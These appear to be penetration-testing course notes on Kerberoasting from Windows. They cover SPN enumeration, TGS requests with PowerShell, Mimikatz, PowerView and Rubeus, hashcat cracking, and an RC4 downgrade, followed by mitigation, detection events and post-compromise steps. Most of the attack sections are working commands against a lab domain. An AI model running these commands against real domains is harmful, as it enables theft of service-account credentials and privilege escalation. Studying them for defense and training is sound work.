# Kerberoasting — From Windows

## What is Kerberoasting?
Requesting Kerberos TGS tickets for accounts with SPNs set, then cracking those tickets offline to recover the service account's plaintext password. Targets **user accounts with SPNs** — not computer accounts.

---

## Method 1 — Manual (setspn + PowerShell + Mimikatz)

### Step 1 — Enumerate SPNs with setspn.exe
```cmd
setspn.exe -Q */*
```
Focus on **user accounts** (e.g. service accounts in `OU=Service Accounts`), ignore computer accounts.

### Step 2 — Request TGS ticket for a specific SPN
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
This loads the TGS ticket into memory for the current session.

### Step 3 — Request tickets for ALL SPNs
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Step 4 — Extract tickets with Mimikatz
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
- With `base64 /out:true` → tickets dumped as base64 blobs
- Without → tickets saved as `.kirbi` files on disk

### Step 5 — Prepare base64 for cracking
```bash
echo "<base64 blob>" | tr -d \\n > encoded_file
cat encoded_file | base64 -d > sqldev.kirbi
```

### Step 6 — Convert to Hashcat format
```bash
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

### Step 7 — Crack with Hashcat
```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

---

## Method 2 — PowerView (Faster)

### Enumerate SPN accounts
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

### Get TGS for a specific user (Hashcat format)
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

### Export ALL tickets to CSV for offline processing
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
cat .\ilfreight_tgs.csv
```

---

## Method 3 — Rubeus (Fastest/Most Featured)

### Get stats on Kerberoastable accounts
```powershell
.\Rubeus.exe kerberoast /stats
```
Shows: total roastable users, supported encryption types, password last set dates.

> Accounts with passwords set 5+ years ago are high-value — likely weak/unchanged passwords.

### Target high-value accounts (admincount=1)
```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Target a specific user
```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

### Output to file
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

> **`/nowrap`** prevents base64 blobs from being column-wrapped — required for clean Hashcat input. Always use it.

---

## Encryption Types — RC4 vs AES

### Hash type identifiers
| Hash Prefix | Encryption | Hashcat Mode |
|---|---|---|
| `$krb5tgs$23$*` | RC4 (type 23) | `13100` |
| `$krb5tgs$18$*` | AES-256 (type 18) | `19700` |
| `$krb5tgs$17$*` | AES-128 (type 17) | `19600` |

### Check an account's supported encryption types
```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
- `msds-supportedencryptiontypes = 0` → RC4 default
- `msds-supportedencryptiontypes = 24` → AES 128/256 only

### Cracking speed comparison (CPU, rockyou.txt)
- RC4 (type 23): **~4 seconds**
- AES-256 (type 18): **~4 minutes 36 seconds**

### Downgrade AES → RC4 with Rubeus
```powershell
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```
Forces RC4 ticket request even when account supports AES — **does not work against Windows Server 2019 DCs** (always returns highest supported encryption).

> On Server 2016 and earlier: enabling AES on SPN accounts does NOT prevent RC4 downgrade — an attacker can still request RC4. On Server 2019: AES-enabled accounts return AES-256 tickets only.

---

## Mitigation

- Use **Managed Service Accounts (MSA)** or **Group Managed Service Accounts (gMSA)** — auto-rotate complex passwords.
- If standard accounts are needed: use very long/complex passphrases not in any wordlist.
- **Don't use Domain Admin or highly privileged accounts as SPN accounts.**
- Test restricting RC4 in Kerberos policy (Group Policy → Network security: Configure encryption types allowed for Kerberos) — thoroughly test before implementation to avoid breaking services.

---

## Detection

- **Event ID 4769** — Kerberos service ticket requested
- **Event ID 4770** — Kerberos service ticket renewed

Enable via Group Policy: `Audit Kerberos Service Ticket Operations`

**Red flags:**
- Large volume of Event ID 4769 from one account in a short timeframe
- Ticket encryption type `0x17` (hex for RC4/type 23) — indicates downgrade or RC4 request

---

## Next Steps After Cracking

With recovered service account credentials:
- RDP or WinRM access to hosts
- Admin access via PsExec or similar tools
- Access to sensitive file shares
- MSSQL DBA access → further privilege escalation
- Continue deeper AD enumeration regardless of access level